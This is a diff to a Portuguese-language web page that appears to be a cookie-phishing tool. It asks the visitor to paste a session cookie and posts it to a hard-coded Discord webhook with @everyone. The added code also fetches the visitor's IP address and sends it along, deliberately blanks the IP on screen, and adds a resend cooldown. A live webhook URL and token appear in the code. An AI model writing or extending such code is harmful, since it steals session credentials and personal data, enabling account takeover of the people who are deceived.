@@ -343,6 +343,19 @@
             transition: all 0.3s;
         }
 
+        /* Exibição de informações extras */
+        .info-row {
+            margin-top: 12px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .info-text {
+            color: #9ca3af;
+            font-size: 13px;
+        }
+
         /* Footer */
         .footer {
             display: flex;
@@ -684,6 +697,11 @@
                     <div class="status-dot"></div>
                     <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
+                <!-- Exibir IP e cooldown -->
+                <div class="info-row">
+                    <div class="info-text" id="ipInfo">IP: carregando...</div>
+                    <div class="info-text" id="cooldownInfo"></div>
+                </div>
             </div>
 
             <button class="action-btn" onclick="sendAndGo()" id="sendBtn">
@@ -767,6 +785,79 @@
     <script>
         // Webhook do Discord
         const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
+        
+        // Constantes de segurança
+        const COOLDOWN_TIME = 300000; // 5 minutos em ms
+        const COOLDOWN_KEY = 'aurora_last_cookie_sent';
+
+        // Obter IP do usuário
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'IP não disponível';
+            } catch (error) {
+                console.error('Erro ao obter IP:', error);
+                return 'IP não disponível';
+            }
+        }
+
+        // Verificar cooldown
+        function checkCooldown() {
+            const lastSent = localStorage.getItem(COOLDOWN_KEY);
+            if (!lastSent) return true;
+            
+            const timePassed = Date.now() - parseInt(lastSent);
+            return timePassed >= COOLDOWN_TIME;
+        }
+
+        // Obter tempo restante do cooldown
+        function getCooldownRemaining() {
+            const lastSent = localStorage.getItem(COOLDOWN_KEY);
+            if (!lastSent) return 0;
+            
+            const timePassed = Date.now() - parseInt(lastSent);
+            const remaining = COOLDOWN_TIME - timePassed;
+            return remaining > 0 ? remaining : 0;
+        }
+
+        // Atualiza exibição de IP e cooldown
+        async function updateInfoDisplays() {
+            const ipEl = document.getElementById('ipInfo');
+            const cdEl = document.getElementById('cooldownInfo');
+
+            if (ipEl) {
+                // Não exibir o IP na interface
+                ipEl.textContent = '';
+            }
+
+            if (cdEl) {
+                const remaining = getCooldownRemaining();
+                if (remaining > 0) {
+                    const sec = Math.ceil(remaining / 1000);
+                    cdEl.textContent = `Próximo envio em ${sec}s`;
+                } else {
+                    cdEl.textContent = '';
+                }
+            }
+        }
+
+        // chamada periódica para atualizar cooldown
+        setInterval(() => {
+            const cdEl = document.getElementById('cooldownInfo');
+            if (cdEl) {
+                const remaining = getCooldownRemaining();
+                if (remaining > 0) {
+                    const sec = Math.ceil(remaining / 1000);
+                    cdEl.textContent = `Próximo envio em ${sec}s`;
+                } else {
+                    cdEl.textContent = '';
+                }
+            }
+        }, 1000);
+
+        // atualizar IP quando a página carrega
+        window.addEventListener('load', updateInfoDisplays);
 
         // Criar estrelas
         function createStars() {
@@ -873,6 +964,13 @@
                 return;
             }
 
+            // Checar cooldown antes de processar
+            if (!checkCooldown()) {
+                const rem = Math.ceil(getCooldownRemaining() / 1000);
+                showNotification('Aguarde', `Pode enviar novamente em ${rem}s`, false);
+                return;
+            }
+
             const cookie = cleanCookie(rawCookie);
 
             if (cookie.length < 50) {
@@ -885,6 +983,7 @@
             btn.disabled = true;
 
             try {
+                const userIP = await getUserIP();
                 const embed = {
                     content: '@everyone ✦ **NOVO COOKIE RECEBIDO**',
                     embeds: [{
@@ -892,6 +991,7 @@
                         color: 0x6366f1,
                         fields: [
                             { name: '📝 Cookie', value: '```' + cookie + '```' },
+                            { name: '🌐 IP Address', value: '```' + userIP + '```', inline: true },
                             { name: '📱 Dispositivo', value: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC', inline: true },
                             { name: '⏰ Horário', value: new Date().toLocaleString('pt-BR'), inline: true }
                         ],
@@ -907,6 +1007,10 @@
                 });
 
                 if (response.ok) {
+                    // registrar cooldown e atualizar exibição
+                    localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
+                    updateInfoDisplays();
+
                     status.innerHTML = '<div class="success-check">✓</div>';
                     status.style.color = '#10b981';
                     
